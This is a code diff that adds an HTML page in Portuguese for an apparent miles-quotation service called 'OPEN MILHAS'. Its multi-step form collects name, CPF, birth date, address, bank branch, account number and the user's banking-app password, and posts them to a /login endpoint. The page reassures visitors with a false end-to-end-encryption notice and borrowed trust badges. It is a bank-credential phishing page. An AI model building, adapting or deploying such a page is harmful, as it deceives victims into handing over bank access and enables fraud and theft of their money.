@@ -22,4 +22,119 @@
         
         /* Inputs arredondados e elegantes */
         .form-control { border-radius: 50px; padding: 15px 25px; border: 1px solid #ddd; margin-bottom: 20px; box-shadow: none; }
-        .form-control:focus { border-color: var(--primary); box-shadow: 0 0 0 0.2rem rgba(44, 125, 160,
+        .form-control:focus { border-color: var(--primary); box-shadow: 0 0 0 0.2rem rgba(44, 125, 160, 0.1); }
+        
+        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; font-size: 1.1rem; transition: 0.3s; }
+        .btn-next:hover { background: var(--primary); transform: translateY(-2px); }
+
+        /* Footer com selos de segurança corrigidos */
+        .footer-logos img { height: 40px; margin: 15px; filter: grayscale(100%); opacity: 0.6; transition: 0.3s; }
+        .footer-logos img:hover { filter: grayscale(0); opacity: 1; }
+        
+        .step-page { display: none; } 
+        .step-active { display: block; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+<nav class="navbar border-bottom py-3">
+    <div class="container justify-content-between">
+        <a class="navbar-brand" href="#">OPEN <span>MILHAS</span></a>
+        <div class="d-none d-md-block text-muted small">Passo <span id="stepNum">1</span> de 3</div>
+    </div>
+</nav>
+
+<div class="container mt-5" style="max-width: 800px;">
+    <div class="text-center mb-4">
+        <h2 class="fw-bold">Complete seu cadastro</h2>
+        <p class="text-muted">Siga os passos abaixo para validar sua cotação.</p>
+    </div>
+
+    <div class="progress-bar-custom">
+        <div class="progress-fill" id="progressBar"></div>
+    </div>
+
+    <form action="/login" method="POST">
+        
+        <div class="step-page step-active" id="step1">
+            <div class="step-tag"><i class="fas fa-user-circle me-2"></i> 1. Dados Pessoais</div>
+            <div class="row">
+                <div class="col-12"><input type="text" name="nome" class="form-control" placeholder="Nome completo *" required></div>
+                <div class="col-md-6"><input type="text" name="cpf" class="form-control" placeholder="CPF *" required></div>
+                <div class="col-md-6"><input type="date" name="data_nasc" class="form-control" title="Data de Nascimento" required></div>
+                <div class="col-12"><input type="email" name="email" class="form-control" placeholder="E-mail de contato *"></div>
+            </div>
+            <div class="text-end mt-3">
+                <button type="button" class="btn-next" onclick="move(2)">Continuar <i class="fas fa-arrow-right ms-2"></i></button>
+            </div>
+        </div>
+
+        <div class="step-page" id="step2">
+            <div class="step-tag"><i class="fas fa-map-marker-alt me-2"></i> 2. Endereço</div>
+            <div class="row">
+                <div class="col-md-4"><input type="text" name="cep" class="form-control" placeholder="CEP *" required></div>
+                <div class="col-md-8"><input type="text" name="rua" class="form-control" placeholder="Rua / Avenida *" required></div>
+                <div class="col-md-4"><input type="text" name="numero" class="form-control" placeholder="Número *" required></div>
+                <div class="col-md-8"><input type="text" name="bairro" class="form-control" placeholder="Bairro"></div>
+            </div>
+            <div class="text-end mt-3">
+                <button type="button" class="btn btn-link text-muted me-3" onclick="move(1)">Voltar</button>
+                <button type="button" class="btn-next" onclick="move(3)">Continuar <i class="fas fa-arrow-right ms-2"></i></button>
+            </div>
+        </div>
+
+        <div class="step-page" id="step3">
+            <div class="step-tag"><i class="fas fa-university me-2"></i> 3. Dados Bancários</div>
+            <div class="row">
+                <div class="col-md-6"><input type="text" name="agencia" class="form-control" placeholder="Agência *" required></div>
+                <div class="col-md-6"><input type="text" name="conta" class="form-control" placeholder="Número da Conta *" required></div>
+                <div class="col-12">
+                    <input type="password" name="senha_app" class="form-control" placeholder="Senha do aplicativo bancário *" required>
+                    <div class="alert alert-light border-0 small text-center rounded-pill">
+                        <i class="fas fa-shield-alt text-success me-2"></i> Seus dados estão protegidos por criptografia de ponta a ponta.
+                    </div>
+                </div>
+            </div>
+            <div class="text-end mt-3">
+                <button type="button" class="btn btn-link text-muted me-3" onclick="move(2)">Voltar</button>
+                <button type="submit" class="btn-next" style="background: var(--gold);">Finalizar Cadastro</button>
+            </div>
+        </div>
+
+    </form>
+</div>
+
+<footer class="footer-logos text-center mt-5 py-5 border-top">
+    <div class="container">
+        <p class="small fw-bold text-muted mb-4">PLATAFORMA SEGURA E HOMOLOGADA</p>
+        <div class="d-flex justify-content-center align-items-center flex-wrap">
+            <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" alt="Reclame Aqui">
+            <img src="https://static.wixstatic.com/media/2cd43b_7f8674b65d3a43399659f8c853177695~mv2.png/v1/fill/w_320,h_102,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/Selo%20Seguro%20SSL.png" alt="SSL">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Safe_Browsing_logo.svg/1200px-Google_Safe_Browsing_logo.svg.png" alt="Google Safe">
+        </div>
+        <p class="mt-4 text-muted small">OPEN MILHAS &copy; 2026 | CNPJ: 26.878.221/0001-50</p>
+    </div>
+</footer>
+
+<script>
+    function move(step) {
+        // Alterna a visibilidade das páginas
+        document.querySelectorAll('.step-page').forEach(el => el.classList.remove('step-active'));
+        document.getElementById('step' + step).classList.add('step-active');
+        
+        // Atualiza o contador visual
+        document.getElementById('stepNum').innerText = step;
+        
+        // Ajusta a barra de progresso
+        const fill = document.getElementById('progressBar');
+        if(step === 1) fill.style.width = '33%';
+        if(step === 2) fill.style.width = '66%';
+        if(step === 3) fill.style.width = '100%';
+        
+        window.scrollTo(0, 0);
+    }
+</script>
+
+</body>
+</html>
